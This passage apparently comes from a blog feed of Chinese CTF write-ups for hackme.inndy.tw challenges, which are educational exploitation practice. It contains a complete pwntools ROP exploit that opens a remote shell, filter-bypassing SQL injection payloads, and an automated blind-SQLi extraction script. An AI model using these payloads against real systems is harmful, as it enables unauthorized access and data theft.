(0x8048000)</span><br></pre></td></tr></table></figure><p>开启了NX机制（栈不可执行Windows平台上称其为DEP），意味着栈不可执行，也就意味着不能直接向栈里面写入shellcode，此时就应该使用ROP（Return-Oriented Programmming Exploit）机制了。攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。</p><p>然后使用readelf查看该程序使用的是静态库还是动态库。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ readelf -d rop</span><br><span class="line"></span><br><span class="line">There is no dynamic section <span class="keyword">in</span> this file.</span><br></pre></td></tr></table></figure><p>发现没有使用动态段，这样以来，问题就更简单了，直接使用直接用ROPgadget –binary rop –ropchain 就可以生成好rop利用链了。</p><p>输出如下的ROP链：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">- Step 5 -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea064) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080481c9) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080de769) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806c943) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure><p>结合前面的16字节的任意填充，基于python的pwntool，编写下面的exp程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process('./rop')</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">'A'</span>*offset      <span class="comment">#16 bytes A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>执行得到shell，cat flag得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
            <tag> Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>whereisflag</title>
      <link href="/2019/10/15/whereisflag/"/>
      <url>/2019/10/15/whereisflag/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-where-is-flag"><a href="#src-hackme-where-is-flag" class="headerlink" title="[src = hackme] where is flag"></a>[src = hackme] where is flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Do you know regular expression?<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，下载一个压缩包，解压得到一个flag文件，打开发现大量字符，其中包含大量FLAG。根据题目提示，应该是要进行正则表达式匹配。</p><p><img src="./whereisflag.PNG" alt="flag"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>本题考察正则表达式的使用。</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> regular expression </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>loginasadmin</title>
      <link href="/2019/10/12/loginasadmin/"/>
      <url>/2019/10/12/loginasadmin/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-loginasadmin-系列"><a href="#src-hackme-loginasadmin-系列" class="headerlink" title="[src = hackme] loginasadmin 系列"></a>[src = hackme] loginasadmin 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>login as admin 0： SQL Injection!<br>login as admin 0.1：  Grab the hidden flag<br>Login as Admin 1：Please login as admin.<br>    Tips: SQL Injection but sqlmap not working anymore.<br>    Update: Source code is available now.<br>    Scanner WON’T WORK<br> <a id="more"></a><br>login as admin 1.2：<br>Get another flag<br>Tips: boolean-based SQL injection, information_schema</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>SQL注入。题目还提供了源码，所以查看，发现进行了一些过滤。</p><h3 id="Login-as-Admin-0"><a href="#Login-as-Admin-0" class="headerlink" title="Login as Admin 0"></a>Login as Admin 0</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);  <span class="comment">//转换为小写，然后随后的if语句过滤了部分注入常用的关键词，如'or 1=1'</span></span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str); <span class="comment">//将单引号替换为\\'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的关键就是绕过这些过滤。strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p><p>一般情况我们可以通过输入<br>admin’ or 1=1# 来进行注入(密码部分任意填写，因为#注释掉后面的查询条件)，因为sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>此时如果没有过滤，查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以注入，但是现在过滤后，“or 1=1”不能使用，这个可以通过“||”绕过（其实也可以用2=2绕过），所以改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' || 1=1#</span></span><br></pre></td></tr></table></figure><p>其中的’被取代为“\\&#39;”，所以查询变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\' || 1=1#'</span> <span class="keyword">AND</span> `password` = <span class="string">'%s'</span></span><br></pre></td></tr></table></figure><p>语法错误，“’”没有被闭合。可以通过在admin后再加一个\进行转义，将\\‘中的第一个\转义,即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\<span class="string">' || 1=1#。</span></span><br></pre></td></tr></table></figure><p>则查询语句变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE `user` = <span class="string">'admin\\'</span> || <span class="number">1</span>=<span class="number">1</span><span class="comment">#' AND `password` = '%s'</span></span><br></pre></td></tr></table></figure><p>可以进行注入，结果如图：</p><p><img src="./loginasadmin0.PNG" alt="login0"></p><p>说明登录的不是管理员账号，从源代码的注释可以看到一下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br></pre></td></tr></table></figure><p>所以表中有一列为is_admin确定了是否为管理员，我们拿到的数据库的第一行返回的用户并不是管理员，所以我们需要查看返回的其他行，通过limit 1,1来限制。我们去第2个输出。</p><p>注入语句变为：admin\‘ || 1=1 limit 1,1#。再进行注入得到flag：<br><img src="./loginasadmin1.PNG" alt="login0"></p><h3 id="Login-as-Admin-0-1"><a href="#Login-as-Admin-0-1" class="headerlink" title="Login as Admin 0.1"></a>Login as Admin 0.1</h3><p>同时提示flag2在数据库中，所以需要通过SQLi来获取数据库里面隐藏的其他flag。其实第一个flag的值已经提示了需要使用UNION查询：</p><p>我们先来测试页面显示的是查询结果的第几列：<br>注入语句为：admin\‘ union select 1,2,3,4#<br>返回页面如下：<br><img src="./loginasadmin2.PNG" alt="login0"><br>2被回显，说明回显的是第2列，我们就利用2的位置显示我们需要的数据，我们演示全部过程：</p><ol><li>查数据库名字：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,database(),3,4#</span></span><br></pre></td></tr></table></figure><p>得到数据库名字为：login_as_admin0<br>2. 查询表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="login_as_admin0"),3,4#</span></span><br></pre></td></tr></table></figure><p>得到有两个表：h1dden_f14g,user<br>可以看出隐藏的flag应该在h1dden_f14g表中。<br>3. 查询表的列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME="h1dden_f14g"),3,4#</span></span><br></pre></td></tr></table></figure><p>得到就只有1列：<br>the_f14g<br>4. 查询该列的具体内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' union select 1,(select the_f14g from login_as_admin0.h1dden_f14g),3,4#</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="./loginasadmin3.PNG" alt="login0"></p><h3 id="Login-as-Admin-1"><a href="#Login-as-Admin-1" class="headerlink" title="Login as Admin 1"></a>Login as Admin 1</h3><p>查看源代码，发现过滤部分。关键处为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格，我们可以用/**/来代替空格进行绕过，其他和前面一样，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\<span class="string">'/**/or/**/2=2/**/limit/**/1,1#</span></span><br></pre></td></tr></table></figure><p>得到flag：<br><img src="./admin1.PNG" alt="login1"></p><h3 id="Login-as-Admin-1-2"><a href="#Login-as-Admin-1-2" class="headerlink" title="Login as Admin 1.2"></a>Login as Admin 1.2</h3><p>同样的绕过方式，但是这一题无回显了，采取bool盲注，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">def exp(i, j):</span><br><span class="line">    <span class="comment"># payload = f"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># 0bdb54c98123f5526ccaed982d2006a9,users   </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload = f"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">    payload = f<span class="string">"admin\\'/**/or/**/ascii(substr((SELECT/**/binary/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/FROM/**/0bdb54c98123f5526ccaed982d2006a9),&#123;i&#125;,1))&gt;&#123;j&#125;/**/limit/**/1,1#"</span></span><br><span class="line">    <span class="comment"># FLAG&#123;W0W, You found the correct table and the flag, and UserAgent&#125;</span></span><br><span class="line">    data = &#123;<span class="string">"name"</span>: payload, <span class="string">"password"</span>: <span class="string">"bitsec"</span>&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"You are admin!"</span> in r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high) <span class="comment">// 2</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += chr((low + high + <span class="number">1</span>) <span class="comment">// 2)</span></span><br><span class="line">    <span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>典型的SQLi注入流程，堪称教学式SQLi。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyyy</title>
      <link href="/2019/10/11/pyyy/"/>
      <url>/2019/10/11/pyyy/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-pyyy"><a href="#src-hackme-pyyy" class="headerlink" title="[src = hackme] pyyy"></a>[src = hackme] pyyy</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you pass the challenage?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>下载题目文件为一个pyc文件（python字节码文件，有python虚拟机解释执行），因此首先需要反编译，这里我们使用uncompyle6来反编译。</p><p>如果没有安装，可以使用下面的命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure><p>安装成功后使用该工具反编译题目给定的pyc文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 pyyy.pyc &gt; pyyy.py</span><br></pre></td></tr></table></figure><p>反编译后的结果保存为python源代码文件pyyy.py。打开阅读发现有有大片数据，关键代码在一个用户输入的位置，源代码对l和c进行比较，如果输入的c与l不相等，就退出了，再读代码发现程序的结果实际跟输入没有关系，所以直接注释掉输入和判断语句执行，就得到flag。注释部分(代码中带#部分)如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, f <span class="keyword">in</span> enumerate(F):</span><br><span class="line">    n = pow(f, m, g)</span><br><span class="line">    this_is = <span class="string">'Y-Combinator'</span></span><br><span class="line">    l = (<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span> *args: y(y)(*args))))(<span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: <span class="number">1</span> <span class="keyword">if</span> x &lt; <span class="number">2</span> <span class="keyword">else</span> f(x - <span class="number">1</span>) * x % n)(g % <span class="number">27777</span>)</span><br><span class="line">    <span class="comment"># c = raw_input('Channenge #%d:' % i)</span></span><br><span class="line">    <span class="comment"># if int(c) != l:</span></span><br><span class="line">    <span class="comment">#     print 'Wrong~'</span></span><br><span class="line">    <span class="comment">#     exit()</span></span><br><span class="line">    z.append(l)</span><br></pre></td></tr></table></figure><p>然后运行得flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/pyyy$ python pyyy.py</span><br><span class="line">flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
